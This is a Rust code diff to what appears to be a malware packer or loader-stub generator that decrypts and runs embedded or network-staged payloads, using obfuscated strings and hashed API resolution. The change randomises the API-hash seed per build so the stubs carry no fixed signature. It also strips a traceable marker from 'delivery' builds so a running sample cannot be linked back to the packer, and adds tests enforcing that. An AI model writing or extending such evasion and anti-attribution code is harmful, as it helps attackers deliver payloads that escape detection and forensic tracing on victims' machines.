@@ -91,7 +91,9 @@ pub struct PayloadCipher {
     pub args: Vec<String>,
     /// Whether the runtime args replace the YAML ones.
     pub args_override: bool,
-    /// Per-step unique marker.
+    /// Per-build stub marker (self-test affordance). Printed to stderr only in
+    /// a debug artifact (`build.stub.debug`); ignored, and never embedded,
+    /// otherwise.
     pub marker: String,
     /// Whether the payload is staged (fetched at run time by a `network_stager`
     /// step) rather than embedded. When true, `path`/`nonce`/`key`/`plaintext_len`
@@ -238,13 +240,18 @@ fn render_common(
 ) -> Result<RenderedSteps> {
     let union = union_of(params);
 
+    // One per-build seed for the API-hashing resolver's FNV-1a offset basis, so
+    // its emitted hash constants are unique to this artifact instead of a fixed
+    // static signature. Emitted into the stub as `API_HASH_SEED`.
+    let api_hash_seed: u64 = rand::random();
+
     let modules: String = params
         .steps
         .iter()
         .map(|step| render_step_module(step, strings))
         .collect::<Result<Vec<_>>>()?
         .concat();
-    let runner = render_runner_body(&params.steps, strings)?;
+    let runner = render_runner_body(&params.steps, strings, params.debug)?;
 
     let mut values = BTreeMap::new();
     values.insert("$STUB_HELPERS$".to_string(), STUB_HELPERS.to_string());
@@ -264,6 +271,7 @@ fn render_common(
             &union,
             strings,
             &api_resolution.required_syscalls(),
+            api_hash_seed,
         ),
     );
     // Per-step payload args are delivered through a thread-local context the
@@ -371,7 +379,11 @@ fn render_step_module(step: &StepPayload, strings: &StringsConfig) -> Result<Str
 }
 
 /// Renders the runner body: one straight-line block per step, in order.
-fn render_runner_body(steps: &[StepPayload], strings: &StringsConfig) -> Result<String> {
+fn render_runner_body(
+    steps: &[StepPayload],
+    strings: &StringsConfig,
+    debug: bool,
+) -> Result<String> {
     let mut body = String::new();
     for step in steps {
         body.push_str(&format!(
@@ -411,7 +423,7 @@ fn render_runner_body(steps: &[StepPayload], strings: &StringsConfig) -> Result<
                         ))
                     })?;
                     body.push_str(&render_execution_block(
-                        step.index, payload, strings, success, failure,
+                        step.index, payload, strings, success, failure, debug,
                     ));
                 }
                 Category::Control => {
@@ -432,16 +444,31 @@ fn render_runner_body(steps: &[StepPayload], strings: &StringsConfig) -> Result<
 }
 
 /// The runner block that decrypts and runs an Execution step's payload.
+///
+/// `debug` is the *only* thing that decides whether the per-build `stub_marker`
+/// is emitted. A delivery build (`debug == false`) must stay silent: the marker
+/// is a runtime token that links a running sample to the packer, so both the
+/// print and the obfuscated string are left out of the generated source
+/// entirely. `build.stub.debug` is a laboratory-only affordance.
 fn render_execution_block(
     index: usize,
     payload: &PayloadCipher,
     strings: &StringsConfig,
     success: &str,
     failure: &str,
+    debug: bool,
 ) -> String {
-    let marker = strings
-        .obfuscate(&payload.marker)
-        .render_stub_expr("stub_marker");
+    let marker_line = if debug {
+        let marker = strings
+            .obfuscate(&payload.marker)
+            .render_stub_expr("stub_marker");
+        format!(
+            "        let stub_marker: String = {marker};\n\
+             \x20       eprintln!(\"{{stub_marker}}\");\n"
+        )
+    } else {
+        String::new()
+    };
     let args = args_expr(&payload.args, strings);
     let overridden = if payload.args_override {
         "true"
@@ -456,8 +483,7 @@ fn render_execution_block(
             "    {{\n\
              \x20       crate::set_stage_args({args}, {overridden});\n\
              \x20       let mut image = crate::take_staged_payload()?;\n\
-             \x20       let stub_marker: String = {marker};\n\
-             \x20       eprintln!(\"{{stub_marker}}\");\n\
+             {marker_line}\
              \x20       match step_{index}::payload(&mut image) {{\n\
              \x20           Ok(code) => {{\n\
              \x20               last = code;{success}\n\
@@ -467,7 +493,7 @@ fn render_execution_block(
              \x20   }}\n",
             args = args,
             overridden = overridden,
-            marker = marker,
+            marker_line = marker_line,
             index = index,
         );
     }
@@ -477,8 +503,7 @@ fn render_execution_block(
          \x20       crate::set_stage_args({args}, {overridden});\n\
          \x20       let enc: &[u8] = include_bytes!(\"{path}\");\n\
          \x20       let mut image = decrypt_step(enc, \"{nonce}\", \"{key}\", {len})?;\n\
-         \x20       let stub_marker: String = {marker};\n\
-         \x20       eprintln!(\"{{stub_marker}}\");\n\
+         {marker_line}\
          \x20       match step_{index}::payload(&mut image) {{\n\
          \x20           Ok(code) => {{\n\
          \x20               last = code;{success}\n\
@@ -492,7 +517,7 @@ fn render_execution_block(
         nonce = hex::encode(payload.nonce),
         key = hex::encode(payload.key),
         len = payload.plaintext_len,
-        marker = marker,
+        marker_line = marker_line,
         index = index,
     )
 }
@@ -690,6 +715,47 @@ mod tests {
             &ApiResolutionConfig::default(),
         )
         .expect("render")
+    }
+
+    fn render_debug(steps: Vec<StepPayload>) -> String {
+        let params = StepsParams {
+            steps,
+            build_args: BTreeMap::new(),
+            debug: true,
+            windows_subsystem: false,
+            kind: OutputKind::Exe,
+            entry: DllEntry::Auto,
+        };
+        render_builtin(
+            &template(),
+            &params,
+            &strings(),
+            &SyscallsConfig::default(),
+            &ApiResolutionConfig::default(),
+        )
+        .expect("render")
+    }
+
+    #[test]
+    fn a_delivery_build_emits_no_stub_marker() {
+        let out = render(vec![execution_step(0)]);
+        assert!(
+            !out.contains("stub_marker"),
+            "a non-debug build must not touch the marker: {out}"
+        );
+        assert!(
+            !out.contains("STUB_MARKER"),
+            "a non-debug build must not embed the marker: {out}"
+        );
+    }
+
+    #[test]
+    fn a_debug_build_prints_the_stub_marker() {
+        let out = render_debug(vec![execution_step(0)]);
+        assert!(
+            out.contains("eprintln!(\"{stub_marker}\")"),
+            "a debug build should print the marker: {out}"
+        );
     }
 
     #[test]
